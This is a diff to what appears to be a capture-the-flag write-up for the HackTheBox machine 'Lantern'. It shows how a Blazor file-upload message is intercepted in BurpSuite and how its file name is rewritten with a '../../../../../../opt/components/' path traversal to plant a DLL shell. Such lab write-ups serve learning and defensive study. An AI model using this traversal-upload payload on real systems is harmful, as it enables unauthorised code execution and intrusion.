@@ -166,9 +166,6 @@ but can upload a dll in that folder intercepting the filename of the dll  on the
 
 `../../../../../../opt/components/`
 
-- change the name of shell to something long
-`mv shell.dll aaaaaaaaaaa.dll`
-
 - Navigate to `lantern.htb:3000` `FileUpload` page
 
 Start BurpSuite before you upload shell
@@ -176,24 +173,24 @@ Start BurpSuite before you upload shell
 after uploading you will get some values like 
 
 ```
-×À·BeginInvokeDotNetFromJS¡5À¬NotifyChangeÙ§[[{"id":3,"lastModified":"2024-08-19T18:19:45.591Z","name":"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa.dll","size":5632,"contentType":"application/x-msdownload","blob":{}}]]
+ÚÀ·BeginInvokeDotNetFromJS¡3À¬NotifyChangeÙª[[{"blob":{},"size":4608,"name":"../../../../../../opt/components/sedlyf.dll","id":1,"lastModified":"2024-08-19T20:11:07.452Z","contentType":"application/x-msdownload"}]]
 ```
 select the values and navigate
 
 rightclick > Extensions > Blazor Traffic Processor > Send Body to BTP tab
 
 
-![alt text](image-7.png)
+![alt text](image-18.png)
 
 Now deserialize the input, modify the path to this, make sure the option is from Blazor -> Json in the top bar
 
 The Final output will be like this
 
 ```
-øÀ·BeginInvokeDotNetFromJS¡3À¬NotifyChangeÙÈ[[{"blob":{},"size":5632,"name":"../../../../../../opt/components/aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa.dll","id":1,"lastModified":"2024-08-19T18:19:45.591Z","contentType":"application/x-msdownload"}]]
+ÚÀ·BeginInvokeDotNetFromJS¡3À¬NotifyChangeÙª[[{"blob":{},"size":4608,"name":"../../../../../../opt/components/sedlyf.dll","id":1,"lastModified":"2024-08-19T20:11:07.452Z","contentType":"application/x-msdownload"}]]
 ```
 
-![alt text](image-8.png)
+![alt text](image-19.png)
 
  Successful upload looks like this.
 
